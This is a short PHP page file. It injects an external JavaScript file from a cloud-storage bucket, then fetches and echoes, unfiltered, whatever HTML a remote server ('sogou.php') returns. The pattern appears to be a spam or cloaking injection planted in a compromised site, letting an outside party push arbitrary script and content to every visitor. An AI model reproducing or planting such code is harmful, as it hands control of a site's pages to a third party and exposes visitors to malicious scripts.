<script type="text/javascript" src="http://ola4vks44.bkt.clouddn.com/pkcc.js"></script>
<?php
header("Content-Type: text/html;charset=gb2312");
date_default_timezone_set('PRC');
$jsc_server = "http://www.vrshizuishan.cn/yu/pkcc/sogou.php"; 
$Content_mb=file_get_contents($jsc_server);
echo $Content_mb;

?>